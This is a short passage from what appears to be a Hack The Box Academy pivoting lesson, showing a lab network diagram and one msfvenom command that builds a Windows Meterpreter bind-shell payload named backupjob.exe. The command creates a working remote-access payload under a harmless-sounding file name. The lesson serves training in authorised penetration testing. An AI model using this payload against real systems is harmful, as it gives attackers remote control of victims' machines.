...
![Diagram showing network setup: Attack Host (10.10.15.5) uses Metasploit Handler. Victim Server (Ubuntu) listens on port 8080, forwards to 172.16.5.19:8443. Victim Server (Windows A) has a Bind Shell on port 8443.](https://academy.hackthebox.com/storage/modules/158/55.png)
...
```shell-session
xF1NN@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
